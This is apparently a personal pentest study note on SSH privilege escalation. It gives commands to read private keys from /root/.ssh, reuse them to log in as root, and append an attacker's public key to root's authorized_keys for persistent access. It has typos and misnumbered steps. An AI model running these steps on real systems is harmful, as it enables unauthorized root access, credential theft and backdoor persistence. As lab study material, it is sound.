---
id: SSH_Escalation
aliases: []
tags: []
---
# SSH Escalation

To elevate privilges on a system via SSH, you can follow these steps:

## Steps 

1. view private ssh keys found at /home/user/.ssh/ or /root/.ssh/id.rsa
2. copy id_rsa files to hacking machine

```bash 
vim id_rsa
chmod 600 id_rsa
ssh root@<ip> -i id_rsa
```

1. If we have write acess to a user /.shh/ direcroty; place public key in authorized_keys file
2. this technique is used to gain control over the shell. 
3. create a new key with: 

```bash
ssh-keygen -f key 
```

4. This will give up two key files which we will use with ssh -i and key.pub which we will copy to the remote server. 
5. add key.pub to /root/.ssh/authorized_keys: 
```bash
echo "ssh-rsa AAAAB...SNIP...M= user@machine" >> /root/.ssh/authorized_keys
```

6. Now log on to the remote server 

```bash 
ssh root@<ip> -i key
```



 



